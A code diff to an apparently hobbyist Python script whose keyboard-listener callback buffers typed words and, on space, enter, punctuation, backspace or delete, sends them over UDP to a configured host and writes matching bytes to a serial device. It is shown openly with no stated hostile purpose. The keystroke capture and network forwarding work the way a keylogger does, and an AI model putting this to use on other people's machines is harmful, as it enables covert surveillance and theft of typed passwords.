@@ -13,7 +13,7 @@ def on_press(key):
     try:
         #print(key)
         #stri += key.char
-        if str(key) == 'Key.space':
+        if str(key) in ('Key.space', 'Key.enter', 'Key.comma', 'Key.period', 'Key.backspace', 'Key.delete'):
             print("{}".format(stri))
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 s.sendto(stri.encode(), (host,port))
@@ -40,18 +40,25 @@ def on_press(key):
                         ser.write(bytearray([18,]))
                         ser.write(char.encode())
                         ser.flush()
-                ser.write(bytearray([17,32,18,32]))
-                ser.flush()
+                if str(key) == 'Key.space':
+                    ser.write(bytearray([17,32,18,32]))
+                    ser.flush()
+                elif str(key) == 'Key.backspace':
+                    ser.write(bytearray([17,8,18,8]))
+                    ser.flush()
+                elif str(key) == 'Key.enter':
+                    ser.write(bytearray([17,10,18,10]))
+                    ser.flush()
+                elif str(key) == 'Key.comma':
+                    ser.write(bytearray([17,44,18,44]))
+                    ser.flush()
+                elif str(key) == 'Key.period':
+                    ser.write(bytearray([17,46,18,46]))
+                    ser.flush()
                 stri = ""
                 print("stri: {}".format(stri))
             stri = ""
             print("stri: {}".format(stri))
-        elif str(key) == 'Key.backspace':
-            ser.write(bytearray([17,8,18,8]))
-            ser.flush()
-        elif str(key) == 'Key.enter':
-            ser.write(bytearray([17,10,18,10]))
-            ser.flush()
         else:
             stri += key.char
             print("stri: {}".format(stri))
